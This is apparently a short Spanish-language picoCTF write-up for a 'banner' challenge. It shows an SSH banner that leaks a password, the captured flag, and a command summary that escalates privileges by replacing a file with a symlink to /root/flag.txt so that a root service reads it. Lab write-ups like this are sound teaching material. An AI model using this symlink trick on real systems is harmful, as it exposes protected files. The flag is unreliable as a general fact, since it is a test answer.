## Descripción

Can you abuse the banner?

The server has been leaking some crucial information on `tethys.picoctf.net 63016`. Use the leaked information to get to the server.

To connect to the running application use `nc tethys.picoctf.net 62448`. From the above information abuse the machine and find the flag in the /root directory.
## Solución

**Solución 1
```
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}

```

#### NOTAS
Abuso de contraseña filtrada y escalada de privilegios creando un enlace simbólico (`ln -s /root/flag.txt banner`) que es leído por un servicio _root_. **Resumen de comandos:** `nc [puerto_1]` (extraer password) > `nc [puerto_2]` (acceder a shell) > `rm banner && ln -s /root/flag.txt banner` > `nc [puerto_1]` (capturar flag).